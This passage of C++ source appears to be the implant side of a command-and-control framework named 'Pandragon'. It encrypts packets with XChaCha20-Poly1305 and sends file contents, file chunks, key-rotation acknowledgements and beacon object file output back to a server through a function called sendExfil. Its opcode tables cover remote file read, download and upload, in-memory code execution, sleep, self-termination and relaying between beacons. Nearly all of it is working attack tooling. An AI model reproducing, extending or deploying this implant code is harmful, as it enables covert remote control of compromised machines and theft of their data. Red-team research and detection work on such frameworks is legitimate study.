    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(s_ntFt, nonce)) {
        c_debugPrint(s_ntFt, "[sendFileWriteResult] CSPRNG failed - aborting packet\n");
        return false;
    }

    // Serialize with encryption
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_beacon_id,
        pandragon::b2s_opcode::FILE_WRITE_RESULT,
        getNextSeqNum(),
        nonce,
        reinterpret_cast<const uint8_t*>(&payload),
        sizeof(payload),
        g_crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );

    if (packet_result.first != pandragon::parse_err::OK) {
        return false;
    }

    bool result = sendExfil(packet_result.second.first, packet_result.second.second, s_path);
    __free(packet_result.second.first);

    return result;
}

/* ---------------------------------------------------------------------------
 * Send file download acknowledgment (FILE_DOWNLOAD_ACK opcode).
 * --------------------------------------------------------------------------- */
bool pandragon::sendFileDownloadAck(uint32_t fileSize, uint8_t status) {
    if (!s_ntFt) return false;

    payload_file_download_ack payload;
    payload.file_size = fileSize;
    payload.status = status;

    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(s_ntFt, nonce)) {
        c_debugPrint(s_ntFt, "[sendFileDownloadAck] CSPRNG failed - aborting packet\n");
        return false;
    }

    // Serialize with encryption
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_beacon_id,
        pandragon::b2s_opcode::FILE_DOWNLOAD_ACK,
        getNextSeqNum(),
        nonce,
        reinterpret_cast<const uint8_t*>(&payload),
        sizeof(payload),
        g_crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );
    
    if (packet_result.first != pandragon::parse_err::OK) {
        return false;
    }

    bool result = sendExfil(packet_result.second.first, packet_result.second.second, s_path);
    __free(packet_result.second.first);

    return result;
}

/* ---------------------------------------------------------------------------
 * Send file chunk data (FILE_CHUNK_DATA opcode).
 * --------------------------------------------------------------------------- */
bool pandragon::sendFileChunkData(uint32_t chunkIndex, uint32_t offset, uint32_t chunkSize, uint8_t status, const uint8_t* data) {
    if (!s_ntFt) return false;
    
    // Build payload: struct + data
    size_t payloadSize = sizeof(payload_file_chunk_data) + (status != 2 ? chunkSize : 0);
    payload_file_chunk_data* payload = (payload_file_chunk_data*)__malloc(payloadSize);
    if (!payload) return false;
    
    payload->chunk_index = chunkIndex;
    payload->offset = offset;
    payload->chunk_size = chunkSize;
    payload->status = status;
    
    // Copy data if not error
    if (status != 2 && data && chunkSize > 0) {
        __memcpy(payload + 1, data, chunkSize);
    }

    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(s_ntFt, nonce)) {
        __free(payload);
        return false;
    }

    // Serialize with encryption
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_beacon_id,
        pandragon::b2s_opcode::FILE_CHUNK_DATA,
        getNextSeqNum(),
        nonce,
        reinterpret_cast<const uint8_t*>(payload),
        payloadSize,
        g_crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );

    __free(payload);

    if (packet_result.first != pandragon::parse_err::OK) {
        return false;
    }

    bool result = sendExfil(packet_result.second.first, packet_result.second.second, s_path);
    __free(packet_result.second.first);

    return result;
}

/* ---------------------------------------------------------------------------
 * Send file upload acknowledgment (FILE_UPLOAD_ACK opcode).
 * --------------------------------------------------------------------------- */
bool pandragon::sendFileUploadAck(uint32_t chunkIndex, uint8_t status) {
    if (!s_ntFt) return false;

    payload_file_upload_ack payload;
    payload.chunk_index = chunkIndex;
    payload.status = status;

    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(s_ntFt, nonce)) {
        return false;
    }

    // Serialize with encryption
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_beacon_id,
        pandragon::b2s_opcode::FILE_UPLOAD_ACK,
        getNextSeqNum(),
        nonce,
        reinterpret_cast<const uint8_t*>(&payload),
        sizeof(payload),
        g_crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );
    
    if (packet_result.first != pandragon::parse_err::OK) {
        return false;
    }
    
    bool result = sendExfil(packet_result.second.first, packet_result.second.second, s_path);
    __free(packet_result.second.first);

    return result;
}


/* ---------------------------------------------------------------------------
 * Send key rotation acknowledgment (KEY_ROTATE_ACK opcode).
 * --------------------------------------------------------------------------- */
bool pandragon::sendKeyRotateAck(uint8_t status) {
    if (!s_ntFt) return false;

    payload_key_rotate_ack payload;
    payload.status = status;
    payload.reserved[0] = 0;
    payload.reserved[1] = 0;
    payload.reserved[2] = 0;

    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(s_ntFt, nonce)) {
        return false;
    }

    // Serialize with encryption
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_beacon_id,
        pandragon::b2s_opcode::KEY_ROTATE_ACK,
        getNextSeqNum(),
        nonce,
        reinterpret_cast<const uint8_t*>(&payload),
        sizeof(payload),
        g_crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );

    if (packet_result.first != pandragon::parse_err::OK) {
        return false;
    }

    bool result = sendExfil(packet_result.second.first, packet_result.second.second, s_path);
    __free(packet_result.second.first);

    return result;
}

/* ---------------------------------------------------------------------------
 * Send BOF output to server (BOF_OUTPUT opcode).
 * --------------------------------------------------------------------------- */
bool pandragon::sendBofOutput(const char* output, size_t len, uint32_t task_id) {
    if (!s_ntFt || !output || len == 0) return false;

    // Allocate buffer for [task_id(4)][output...]
    size_t total_len = len + sizeof(uint32_t);
    uint8_t* payload_buf = (uint8_t*)__malloc(total_len);
    if (!payload_buf) return false;

    // Pack task_id (LE) and data
    payload_buf[0] = (task_id) & 0xFF;
    payload_buf[1] = (task_id >> 8) & 0xFF;
    payload_buf[2] = (task_id >> 16) & 0xFF;
    payload_buf[3] = (task_id >> 24) & 0xFF;
    __memcpy(payload_buf + sizeof(uint32_t), output, len);

    // Generate cryptographically secure random nonce for this packet
    uint8_t nonce[24] = {0};
    if (!generateSecureNonce(s_ntFt, nonce)) {
        __free(payload_buf);
        return false;
    }

    // Serialize with encryption
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    auto packet_result = pandragon::serializePacket(
        g_beacon_id,
        pandragon::b2s_opcode::BOF_OUTPUT,
        getNextSeqNum(),
        nonce,
        payload_buf,
        total_len,
        g_crypto_key,
        runtime.getConfig().options.pad,
        runtime.getConfig().pad_max
    );

    __free(payload_buf);
    
    if (packet_result.first != pandragon::parse_err::OK) {
        return false;
    }

    bool result = sendExfil(packet_result.second.first, packet_result.second.second, s_path);
    __free(packet_result.second.first);

    return result;
}



namespace pandragon {

    // -- Little-endian decode helpers ----------------------------------------
    static inline uint32_t read_le32(const uint8_t* p) {
        return static_cast<uint32_t>(p[0])
             | static_cast<uint32_t>(p[1]) << 8
             | static_cast<uint32_t>(p[2]) << 16
             | static_cast<uint32_t>(p[3]) << 24;
    }


    // -- Opcode validation helpers --------------------------------------------
    static bool isValidS2BOpcode(uint8_t op) {
        switch (static_cast<s2b_opcode>(op)) {
            case s2b_opcode::NO_TASKS:
            case s2b_opcode::ECHO:
            case s2b_opcode::SLEEP:
            case s2b_opcode::FILE_READ:
            case s2b_opcode::DIE:
            case s2b_opcode::BOF_EXEC:
            case s2b_opcode::BOF_FREE:
            case s2b_opcode::LONG_RUNNING_BOF:
            case s2b_opcode::FILE_DOWNLOAD:
            case s2b_opcode::FILE_UPLOAD:
            // Key rotation opcode
            case s2b_opcode::ROTATE_KEY:
                return true;
            // Chunked file transfer opcodes
            case s2b_opcode::FILE_DOWNLOAD_START:
            case s2b_opcode::FILE_DOWNLOAD_CHUNK:
            case s2b_opcode::FILE_UPLOAD_START:
            case s2b_opcode::FILE_UPLOAD_CHUNK:
                return true;
            // Relay opcodes
            case s2b_opcode::START_RELAY:
            case s2b_opcode::STOP_RELAY:
            case s2b_opcode::RELAY_ADD_CHILD:
            case s2b_opcode::RELAY_REMOVE_CHILD:
            case s2b_opcode::RELAY_DOWN:
                return true;
            default:
                return false;
        }
    }

    static bool isValidB2SOpcode(uint8_t op) {
        switch (static_cast<b2s_opcode>(op)) {
            case b2s_opcode::BEACON_CHECK_IN:
            case b2s_opcode::BEACON_POLL:
            case b2s_opcode::BEACON_TASK_RESULT:
            case b2s_opcode::BEACON_ERROR:
            case b2s_opcode::FILE_CONTENT:
            case b2s_opcode::FILE_WRITE_RESULT:
            case b2s_opcode::BOF_OUTPUT:
            case b2s_opcode::LIST_FILES_RESULT:
            // Key rotation acknowledgment
            case b2s_opcode::KEY_ROTATE_ACK:
                return true;
            // Chunked file transfer opcodes
            case b2s_opcode::FILE_DOWNLOAD_ACK:
            case b2s_opcode::FILE_CHUNK_DATA:
            case b2s_opcode::FILE_UPLOAD_ACK:
                return true;
            // Relay opcodes
            case b2s_opcode::RELAY_CHILD_UP:
                return true;
            default:
                return false;
        }
    }


    // -- parsePacket -------------------------------------------------
    //
    //  @param buf         raw wire bytes (must stay alive as long as out is used)
    //  @param buf_len     total byte count in buf
    //  @param direction   true  = server->beacon (validate s2b opcodes)
    //                     false = beacon->server (validate b2s opcodes)
    //  @param out         filled on OK only
    //  @returns           parse_err::OK or a specific failure code
    //
    parse_err parsePacket(const uint8_t* buf,
                          size_t         buf_len,
                          bool           direction_s2b,
                          parsed_packet& out)
    {
        if (!buf)
            return parse_err::NULL_BUFFER;

        // 1. Size guard: reject anything shorter than a full header.
        if (buf_len < HEADER_LEN)
            return parse_err::BUFFER_TOO_SMALL;

        // 2. Decode fields explicitly from raw bytes (no struct cast).
        size_t offset = 0;

        out.magic = read_le32(buf + offset);            offset += 4;

        out.version = static_cast<version_t>(buf[offset]);  offset += 1;

        memcpy(out.beacon_id, buf + offset, 8);         offset += 8;

        out.opcode = buf[offset];                        offset += 1;

        out.seq_num = read_le32(buf + offset);           offset += 4;

        memcpy(out.nonce, buf + offset, 24);             offset += 24;

        out.payload_len = read_le32(buf + offset);       offset += 4;

        // offset == HEADER_LEN here (46 bytes)

        // 3. Magic check.
        if (out.magic != PANDRAGON_MAGIC)
            return parse_err::BAD_MAGIC;

        // 4. Version check: extend this when you bump version_t.
        if (out.version != version_t::epoch)
            return parse_err::BAD_VERSION;

        // 5. Opcode check: direction-aware.
        bool opcode_ok = direction_s2b
            ? isValidS2BOpcode(out.opcode)
            : isValidB2SOpcode(out.opcode);

        c_debugPrint(s_ntFt, "[parsePacket] opcode=0x%02x direction_s2b=%d opcode_ok=%d\n",
                       (unsigned)out.opcode, direction_s2b, opcode_ok);

        if (!opcode_ok)
            return parse_err::BAD_OPCODE;

        // 6. Payload bounds: payload_len (ciphertext + MAC) must fit in remaining buf.
        if (buf_len < HEADER_LEN) {
            c_debugPrint(s_ntFt, "[parsePacket] BUFFER_TOO_SMALL: %zu < %u\n",
                           buf_len, (unsigned)HEADER_LEN);
            return parse_err::BUFFER_TOO_SMALL;
        }

        c_debugPrint(s_ntFt, "[parsePacket] Checking: payload_len=%u vs buf_len-HEADER_LEN=%zu\n",
                       (unsigned)out.payload_len, buf_len - HEADER_LEN);
        if (out.payload_len > buf_len - HEADER_LEN) {
            c_debugPrint(s_ntFt, "[parsePacket] PAYLOAD_OVERFLOW: %u > %zu\n",
                           (unsigned)out.payload_len, buf_len - HEADER_LEN);
            return parse_err::PAYLOAD_OVERFLOW;
        }

        // 7. Payload pointer: point to ciphertext immediately after header
        out.payload_ptr = buf + HEADER_LEN;

        return parse_err::OK;
    }

    // -- encryptPayload ----------------------------------------
    // Encrypts payload and authenticates both payload and header (via AD)
    static std::pair<int, uint8_t*> encryptPayload(
        const uint8_t* plaintext,
        size_t plaintext_len,
        const uint8_t nonce[24],
        const uint8_t key[32],
        const uint8_t* header_data = nullptr,    // Header to authenticate (not encrypted)
        size_t header_len = 0)
    {
        if (!nonce || !key) {
            return std::make_pair(-1, nullptr);
        }
        // plaintext can be NULL if plaintext_len is 0 (empty payload)
        if (!plaintext && plaintext_len > 0) {
            return std::make_pair(-1, nullptr);
        }

        // Allocate buffer for encrypted data + MAC (16 bytes)
        size_t encrypted_size = plaintext_len + 16;
        uint8_t* encrypted_buffer = (uint8_t*)__malloc(encrypted_size);
        if (!encrypted_buffer) {
            return std::make_pair(-2, nullptr);
        }

        size_t actual_encrypted_size;
        int result = xchacha20poly1305_encrypt(
            encrypted_buffer,
            &actual_encrypted_size,
            plaintext,
            plaintext_len,
            header_data,    // Additional Data: header bytes for authentication
            header_len,
            nonce,
            key
        );

        if (result != 0) {
            __free(encrypted_buffer);
            return std::make_pair(result, nullptr);
        }

        return std::make_pair(0, encrypted_buffer);
    }

    // -- decryptPayload --------------------------------------------------------
    // Decrypts payload and authenticates both payload and header (via AD)
    static std::pair<int, uint8_t*> decryptPayload(
        const uint8_t* ciphertext,
        size_t ciphertext_len,  // includes 16-byte MAC
        const uint8_t nonce[24],
        const uint8_t key[32],
        const uint8_t* header_data = nullptr,    // Header to authenticate (not encrypted)
        size_t header_len = 0)
    {
        c_debugPrint(s_ntFt, "[decryptPayload] ENTER: ciphertext_len=%zu, s_ntFt=%p", ciphertext_len, (void*)s_ntFt);
        c_debugPrint(s_ntFt, "ciphertext_len=%zu nonce=%p key=%p\n",
                       ciphertext_len, (const void*)nonce, (const void*)key);

        if (!ciphertext || !nonce || !key || ciphertext_len < 16) {
            c_debugPrint(s_ntFt, "Invalid params: ciphertext=%p len=%zu\n",
                           (const void*)ciphertext, ciphertext_len);
            return std::make_pair(-1, nullptr);
        }

        size_t plaintext_size = ciphertext_len - 16;
        c_debugPrint(s_ntFt, "plaintext_size=%zu\n", plaintext_size);

        size_t alloc_size = plaintext_size > 0 ? plaintext_size : 1;
        uint8_t* plaintext_buffer = (uint8_t*)__malloc(alloc_size);
        
        if (!plaintext_buffer) {
            c_debugPrint(s_ntFt, "malloc failed\n");
            return std::make_pair(-2, nullptr);
        }

        size_t actual_plaintext_size;
        int result = xchacha20poly1305_decrypt(
            plaintext_buffer,
            &actual_plaintext_size,
            ciphertext,
            ciphertext_len,
            header_data,    // Additional Data: header bytes for authentication
            header_len,
            nonce,
            key
        );

        c_VERBOSE(s_ntFt, "xchacha20poly1305_decrypt returned %d, actual_size=%zu\n",
                       result, actual_plaintext_size);
        
        if (result != 0) {
            __free(plaintext_buffer);
            return std::make_pair(result, nullptr);
        }

        return std::make_pair(0, plaintext_buffer);
    }

    // -- serializePacket -----------------------------------------------
    // Packet format: [HEADER][ciphertext+MAC]
    // Header fields (INCLUDING payload_len) are authenticated via AD
    // Plaintext is padded using PKCS#7 to a multiple of 16 bytes.
    std::pair<parse_err, std::pair<uint8_t*, size_t>> serializePacket(
        const uint8_t beaconID[8],
        b2s_opcode opcode,
        uint32_t seq,
        const uint8_t nonce[24],
        const uint8_t* payload,
        size_t payload_len,
        const uint8_t* encryption_key,
        bool pad,
        uint16_t pad_max)
    {
        if (!beaconID || !nonce || !encryption_key) {
            return std::make_pair(parse_err::NULL_BUFFER, std::make_pair(nullptr, 0));
        }

        // Validate opcode
        if (!isValidB2SOpcode(static_cast<uint8_t>(opcode))) {
            return std::make_pair(parse_err::BAD_OPCODE, std::make_pair(nullptr, 0));
        }

        // 1. Calculate padded length (PKCS#7)
        size_t plaintext_len = payload_len;
        size_t padded_len = plaintext_len;
        
        if (pad) {
            if (plaintext_len > SIZE_MAX - 16) {
                return std::make_pair(parse_err::NULL_BUFFER, std::make_pair(nullptr, 0));
            }
            // Standard PKCS#7: always add 1-16 bytes to reach multiple of 16
            padded_len = (plaintext_len + 16) & ~15;
            
            // If user wants random padding up to pad_max, we can choose a random multiple of 16
            // that is >= standard padded_len and <= pad_max.
            if (pad_max > padded_len) {
                size_t max_blocks = pad_max / 16;
                size_t min_blocks = padded_len / 16;
                if (max_blocks > min_blocks) {
                    uint8_t randByte = 0;
                    generateSecureRandom(s_ntFt, &randByte, 1);
                    size_t extra_blocks = randByte % (max_blocks - min_blocks + 1);
                    padded_len += (extra_blocks * 16);
                }
            }
        } else {
            // Still pad to 16 for "professionalism" and block alignment if needed, 
            // but the user requested 'pad' flag controls this.
            // Actually, spec REQ-008 says: "If padding is enabled, the plaintext MUST be padded using PKCS#7"
            // If NOT enabled, we just use raw length.
            padded_len = plaintext_len;
        }

        // 2. Prepare plaintext with padding
        uint8_t* padded_plaintext = (uint8_t*)__malloc(padded_len > 0 ? padded_len : 1);
        if (!padded_plaintext) return std::make_pair(parse_err::NULL_BUFFER, std::make_pair(nullptr, 0));

        if (payload && plaintext_len > 0) {
            __memcpy(padded_plaintext, payload, plaintext_len);
        }
        
        if (pad && padded_len > plaintext_len) {
            pkcs7Pad(padded_plaintext, plaintext_len, padded_len);
        }

        // 3. Compute encrypted payload length (padded plaintext + 16-byte MAC)
        size_t encrypted_payload_len = padded_len + 16;

        // 4. Build the header used for wire transmission and AAD
        uint8_t header_bytes[HEADER_LEN];
        size_t offset = 0;
        *(uint32_t*)(header_bytes + offset) = PANDRAGON_MAGIC; offset += 4;
        header_bytes[offset] = static_cast<uint8_t>(version_t::epoch); offset += 1;
        __memcpy(header_bytes + offset, beaconID, 8); offset += 8;
        header_bytes[offset] = static_cast<uint8_t>(opcode); offset += 1;
        *(uint32_t*)(header_bytes + offset) = seq; offset += 4;
        __memcpy(header_bytes + offset, nonce, 24); offset += 24;
        *(uint32_t*)(header_bytes + offset) = static_cast<uint32_t>(encrypted_payload_len); offset += 4;

        // 5. Encrypt payload WITH header as Additional Data (AAD)
        // REQ-005: payload_len is INCLUDED in AAD.
        auto encrypt_result = encryptPayload(padded_plaintext, padded_len, nonce, encryption_key,
                                              header_bytes, HEADER_LEN);
        __free(padded_plaintext);

        if (encrypt_result.first != 0) {
            return std::make_pair(parse_err::PAYLOAD_OVERFLOW, std::make_pair(nullptr, 0));
        }

        uint8_t* encrypted_payload = encrypt_result.second;

        // 6. Allocate buffer for the complete packet [HEADER][CIPHERTEXT+MAC]
        size_t total_packet_size = HEADER_LEN + encrypted_payload_len;
        uint8_t* packet_buffer = (uint8_t*)__malloc(total_packet_size);
        if (!packet_buffer) {
            __free(encrypted_payload);
            return std::make_pair(parse_err::NULL_BUFFER, std::make_pair(nullptr, 0));
        }

        // Copy header and encrypted payload
        __memcpy(packet_buffer, header_bytes, HEADER_LEN);
        __memcpy(packet_buffer + HEADER_LEN, encrypted_payload, encrypted_payload_len);

        __free(encrypted_payload);

        return std::make_pair(parse_err::OK, std::make_pair(packet_buffer, total_packet_size));
    }

    /* -- deserializePacket -------------------------------------
    / Decrypts payload and authenticates header fields and AAD
        Technically here we should check beacon ID, but 2 beacons sharing the same ID means they also share the same key [?],
        which is impossible in normal deployments.
    */
    std::pair<parse_err, parsed_packet> deserializePacket(
        const uint8_t* packet_buffer,
        size_t packet_len,
        const uint8_t* encryption_key,
        bool direction_s2b)
    {
        c_VERBOSE(s_ntFt, "packet_len=%zu key=%p dir=%d\n",
                       packet_len, (const void*)encryption_key, direction_s2b);

        if (!packet_buffer || !encryption_key) {
            return std::make_pair(parse_err::NULL_BUFFER, parsed_packet{});
        }

        // Parse the header first
        parsed_packet parsed = {};
        parsed.decrypted_payload = nullptr;
        parsed.decrypted_len = 0;

        parse_err parse_result = parsePacket(packet_buffer, packet_len, direction_s2b, parsed);
        if (parse_result != parse_err::OK) {
            return std::make_pair(parse_result, parsed);
        }

        // Build header for authentication - use header as-is (including payload_len)
        uint8_t header_for_auth[HEADER_LEN];
        __memcpy(header_for_auth, packet_buffer, HEADER_LEN);

        // Decrypt the payload WITH full header as Additional Data (AAD)
        auto decrypt_result = decryptPayload(parsed.payload_ptr, parsed.payload_len,
                                              parsed.nonce, encryption_key,
                                              header_for_auth, HEADER_LEN);

        if (decrypt_result.first != 0) {
            c_debugPrint(s_ntFt, "[deserializePacket] Header authentication failed!\n");
            return std::make_pair(parse_err::DECRYPTION_FAILED, parsed);
        }

        // Store decrypted payload and strip PKCS#7 padding if present
        uint8_t* plaintext = decrypt_result.second;
        size_t plaintext_len = parsed.payload_len - MAC_LEN;
        
        // Try unpadding
        size_t unpadded_len = pkcs7Unpad(plaintext, plaintext_len);
        if (unpadded_len != (size_t)-1) {
            parsed.decrypted_len = unpadded_len;
        } else {
            // No valid PKCS#7 padding found - use raw decrypted length
            parsed.decrypted_len = plaintext_len;
        }
        
        parsed.decrypted_payload = plaintext;

        c_VERBOSE(s_ntFt, "Success: decrypted_len=%zu (header authenticated)\n", parsed.decrypted_len);
        return std::make_pair(parse_err::OK, parsed);
    }

} // namespace pandragon